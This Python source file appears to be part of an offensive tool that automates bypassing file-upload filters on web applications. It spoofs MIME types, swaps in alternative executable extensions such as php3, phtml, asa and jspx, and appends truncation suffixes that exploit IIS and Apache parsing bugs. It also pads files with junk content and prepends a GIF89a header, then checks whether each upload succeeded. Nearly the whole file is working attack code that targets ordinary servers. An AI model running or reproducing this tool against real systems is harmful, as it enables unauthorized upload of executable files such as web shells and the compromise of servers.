#!/usr/bin/python
# -*- coding:utf8 -*-
#author:Jinhao

import sys
import os
from comman import *
from color_output import *

"""
1，混淆header，畸形请求
2，混淆文件名，截断，换行
3，MIME
4，文件内容检测绕过
5，同义后缀名替换
...
"""
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
}

class General:
    def __init__(self, args, data, initUrls, comman, stop=True):
        '''
        初始化
        :param args: args集
        :param data: 传送参数
        :param initUrls: 初始URL集
        :param comman: 通用类
        :param stop: 是否即停
        '''
        self.args = args
        self.data = data
        self.initUrls = initUrls
        self.Comman = comman
        self.stop = stop

    def exploit(self):
        '''
        尝试攻击并检查输出
        :return:
        '''
        self.prepare()   # 设置通用参数
        p1 = self.mimeBypass()   # MIME绕过
        c1 = self.Comman.checkResult(self.initUrls, p1)
        self.end(check=c1, stop=self.stop)
        self.rareSuffixBypass()  # 同义后缀名绕过
        self.truncatedBypass()  # 截断上传绕过
        self.confuseBypass()    # 文件内容检测绕过
        self.end(stop=True)
        return

    def prepare(self):
        '''
        解析通用设置
        :return:
        '''
        if self.args.mime != '':   # 预设content-type
            self.p_ct = self.args.mime
        elif self.args.ct != '':
            self.p_ct = self.Comman.setContentType(self.args.ct)
        else:
            self.p_ct = 'image/png'
        if self.args.attach != '':  # 使用attach文件上传
            self.p_file = self.args.attach
            self.p_filename = self.Comman.getFilename(self.args.attach)
        else:
            self.p_file = self.args.f
            self.p_filename = self.Comman.getFilename(self.args.f)
        return


    def end(self, check=False, stop=False):
        # 判断是否结束
        if check == True:
            print(green('[ result ]') + cyan('成功上传'))
            print()
        if stop == True:
            print(blue('[ schedule ]') + cyan('测试完毕'))
            sys.exit()
        return


    def fuzzHeaders(self, headers, key, value):
        # 混淆headers
        headers[key] = value
        return headers

    def fuzzRareSuffix(self, suffix, filename):
        # 替换后缀名
        PHP = ['php', 'php2', 'phtml', 'php3', 'php5', 'pHP']
        ASP = ['asa', 'asp', 'aspx', 'ascx', 'ashx', 'cer', 'ASp']
        JSP = ['jsp', 'jspx', 'jSP']
        if suffix in PHP:
            PHP.remove(suffix)
            return [filename.replace(suffix, x) for x in PHP]
        if suffix in ASP:
            ASP.remove(suffix)
            return [filename.replace(suffix, x) for x in ASP]
        if suffix in JSP:
            JSP.remove(suffix)
            return [filename.replace(suffix, x) for x in JSP]
        return []

    def addTruncated(self, filename):
        # 添加截断后缀
        Truncated = ['%00.jpg', '::$DATA', '0x00.jpg', '/00.jpg', ' .jpg', "\n"]   # 尝试截断
        apache = ['.xxx.yyy']      # apache解析漏洞
        iis = [';.jpg']   # iis解析漏洞
        fns = []
        fns += [filename+x for x in Truncated]
        fns += [filename+y for y in apache]
        fns += [filename+z for z in iis]
        fns += ["[0x09]"+filename]
        return fns

    def longFilename(self, suffix):
        # 构造超长文件名
        fns = []
        system_length_limit = {
            'windows': 260,
            'linux': 255
        }
        length = len(suffix) + 1   # 后缀名长度
        for x in system_length_limit:
            f = 'a' * (system_length_limit[x] - length) + '.' + suffix + '.jpg'
            fns.append(f)
        return fns

    def mimeBypass(self):
        '''
        MIME绕过后端检测
        :return:
        '''
        print(blue('[ schedule ]') + cyan('利用MIME绕过测试'))
        print(blue('[ Info ]') + fuchsia('指定MIME为:') + cyan(self.p_ct))
        files = self.setFiles(self.args.field, file=self.p_file, ct=self.p_ct)
        res = self.Comman.upload(self.args.u, files, data=self.data)
        return res

    def rareSuffixBypass(self):
        '''
        同义后缀名替换
        :return:
        '''
        suffix = self.getSuffix(self.p_filename)    # 获取文件后缀名
        if suffix == False:
            return
        fns = self.fuzzRareSuffix(suffix, self.p_filename)   # 同义后缀名替换
        if fns != []:
            print(blue('[ schedule ]') + cyan('利用不同的拓展名及文件名大小写混淆绕过'))
            for f in fns:
                print(blue('[ Info ]') + fuchsia('上传文件名:') + cyan(f))
                files = self.setFiles(
                    field=self.args.field,
                    file=self.p_file,
                    filename=f
                )
                res = self.Comman.upload(self.args.u, files, self.data)
                check = self.Comman.checkResult(self.initUrls, res)
                self.end(check=check, stop=self.stop)
        return

    def truncatedBypass(self):
        '''
        尝试以特殊字符截断、系统解析漏洞截断bypass
        :return:
        '''
        suffix = self.getSuffix(self.p_filename)    # 获取文件后缀名
        fns = self.addTruncated(self.p_filename)    # 添加特殊结尾
        fns += self.longFilename(suffix)     # 构造超长文件名
        if fns != []:
            print(blue('[ schedule ]') + cyan('尝试以特殊字符截断、系统解析漏洞截断bypass'))
            for f in fns:
                print(blue('[ Info ]') + fuchsia('上传文件名:') + cyan(f))
                files = self.setFiles(
                    field=self.args.field,
                    file=self.p_file,
                    filename=f
                )
                res = self.Comman.upload(self.args.u, files, self.data)
                check = self.Comman.checkResult(self.initUrls, res)
                self.end(check=check, stop=self.stop)
        return

    def confuseBypass(self):
        '''
        文件内容混淆
        文件合并上传绕过
        :return:
        '''
        Files = []
        if self.args.attach != '':  # 存在attach文件，合并至file
            attach = self.args.attach
            Files += self.mergeFiles(
                field=self.args.field,
                file=self.args.f,
                attach=attach
            )
        if Files != []:
            print(blue('[ schedule ]') + cyan('尝试以内容混淆绕过检测'))
            for f in Files:
                print(blue('[ Info ]') + fuchsia('绕过姿势:') + cyan(f['Desc']))
                res = self.Comman.upload(self.args.u, f['files'], self.data)
                check = self.Comman.checkResult(self.initUrls, res)
                self.end(check=check, stop=self.stop)
        return


    def getSuffix(self, filename):
        # 获取文件名后缀
        try:
            ext = filename.split('.')[-1]
            return ext
        except:
            print(red('[ Error ]') + yellow('获取文件后缀名失败'))
            return False

    def mergeFiles(self, field, file, attach):
        # 合并文件内容
        Files = []
        try:
            files = {
                field: (
                attach,   # 文件名使用attach的
                open(file, 'rb').read() + open(attach, 'rb').read(),  # attach内容附加在file后
                self.p_ct
            )
            }
            Files.append({
                'files': files.copy(),
                'Desc': '文件内容合并1'
            })
            files = {
                field: (
                    file,  # 文件名使用file的
                    open(file, 'rb').read() + open(attach, 'rb').read()  # attach内容附加在file后
                )
            }
            Files.append({
                'files': files.copy(),
                'Desc': '文件内容合并2'
            })
        except:
            print(red('[ Error ]') + yellow('合并文件失败'))
        try:
            ran_str = self.Comman.getRandomStr(10000000)
            files = {
                field: (
                    attach,  # 文件名使用attach的
                    ran_str.encode() + open(attach, 'rb').read(),
                    self.p_ct
                )
            }
            Files.append({
                'files': files.copy(),
                'Desc': '10MB垃圾内容填充1'
            })
            files = {
                field: (
                    file,  # 文件名使用file的
                    ran_str.encode() + open(attach, 'rb').read()
                )
            }
            Files.append({
                'files': files.copy(),
                'Desc': '10MB垃圾内容填充2'
            })
        except:
            print(red('[ Error ]') + yellow('垃圾内容填充失败'))
        try:
            files = {
                field: (
                file,   # 文件名使用file的
                'GIF89a'.encode() + open(attach, 'rb').read()  # 添加文件头
            )
            }
            Files.append({
                'files': files.copy(),
                'Desc': '添加合法文件头'
            })
        except:
            print(red('[ Error ]') + yellow('添加文件头失败'))
        return Files


    def setFiles(self, field, file, filename='', ct='', other={}):
        # 设置文件
        if filename == '':
            filename = self.Comman.getFilename(file)
        try:
            files = {
                field: (
                filename,
                open(file, 'rb'),
                ct,
                other
            )
            }
            # print(files)
            return files
        except:
            print(red('[ Error ]') + yellow('读取文件失败'))
            sys.exit()


